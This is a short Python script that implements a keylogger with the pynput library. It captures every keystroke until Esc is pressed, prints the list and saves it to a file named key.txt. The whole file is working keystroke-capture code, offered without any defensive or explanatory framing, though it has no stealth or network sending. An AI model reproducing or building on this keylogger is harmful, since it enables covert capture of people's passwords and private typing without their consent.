from pynput import keyboard


def main():
    keylogger_array = []

    def on_press(key):
        if key == keyboard.Key.esc:
            return False
        try:
            k = key.char
        except:
            k = key.name
        keylogger_array.append(str(k))

    list = keyboard.Listener(on_press=on_press)
    list.start()
    list.join()
    print(keylogger_array)
    with open('key.txt', 'w') as file:
        file.write(str(keylogger_array))


if __name__ == '__main__':
    main()
